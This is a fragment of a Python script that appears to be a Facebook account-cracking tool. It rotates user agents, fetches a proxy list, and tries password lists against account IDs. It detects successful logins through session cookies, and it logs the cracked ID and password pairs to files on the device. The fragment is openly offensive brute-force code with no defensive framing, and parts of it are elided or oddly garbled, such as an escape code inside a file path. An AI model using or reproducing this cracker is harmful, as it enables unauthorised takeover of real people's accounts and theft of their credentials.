...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/SABBIR69/.SABBIR-proxy.txt').text
...
def fia():    
			print(logo)
			print('\x1b[97;1m[✓] Dj➼  VERSION :\x1b[1;92m 1.0 ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Dj➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			SABBIR=session.cookies.get_dict().keys()
			if "c_user" in SABBIR:
				print('\r\r\033[1;31m[Dj➼-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/Dj-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SABBIR:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Dj➼-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Dj-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Dj➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SABBIR:
				...
				print('\r\r\033[1;32m[Dj➼-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Dj➼-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Dj-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mDj➼\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Dj➼-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Dj➼-OK] '+uid+' | '+ps+'\33[0;97m')
